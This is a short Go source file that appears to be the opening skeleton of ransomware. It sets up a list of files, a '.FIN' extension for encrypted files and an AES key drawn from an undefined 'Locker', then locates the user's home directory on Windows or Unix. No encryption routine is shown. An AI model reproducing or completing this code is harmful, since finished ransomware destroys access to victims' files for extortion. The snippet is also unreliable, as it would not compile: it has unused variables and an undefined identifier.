package main

import (
	"os"
	"runtime"
)

func main() {
	var files []string
	var home string
	var ext = ".FIN"

	AESkey := Locker

	// Logic to determine if host is running Windows
	if runtime.GOOS == "windows" {
		home = os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
		if home == "" {
			home = os.Getenv("USERPROFILE")
		}
	} else {
		home = os.Getenv("HOME")
	}
}
